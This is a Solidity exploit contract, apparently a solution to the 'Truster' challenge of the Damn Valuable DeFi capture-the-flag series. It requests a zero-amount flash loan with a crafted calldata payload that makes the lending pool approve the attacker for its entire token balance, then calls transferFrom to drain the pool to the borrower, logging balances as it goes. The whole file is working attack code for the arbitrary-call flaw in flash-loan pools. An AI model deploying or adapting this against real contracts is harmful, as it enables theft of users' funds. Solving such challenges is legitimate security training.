// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import {TrusterLenderPool} from './TrusterLenderPool.sol';
import {DamnValuableToken} from '../DamnValuableToken.sol';
import {console} from 'hardhat/console.sol';

contract TakeAllTruster {
    constructor(address _token, address _pool, address _borrower) {
        DamnValuableToken token = DamnValuableToken(_token);
        console.log(token.balanceOf(address(_pool)));
        TrusterLenderPool(_pool).flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSelector(token.approve.selector, (address(this)), token.balanceOf(address(_pool)))
        );
        console.log(token.allowance(address(this), address(_pool)));
        token.transferFrom(_pool, _borrower, token.balanceOf(address(_pool)));
        console.log(token.balanceOf(address(_pool)));
    }
}
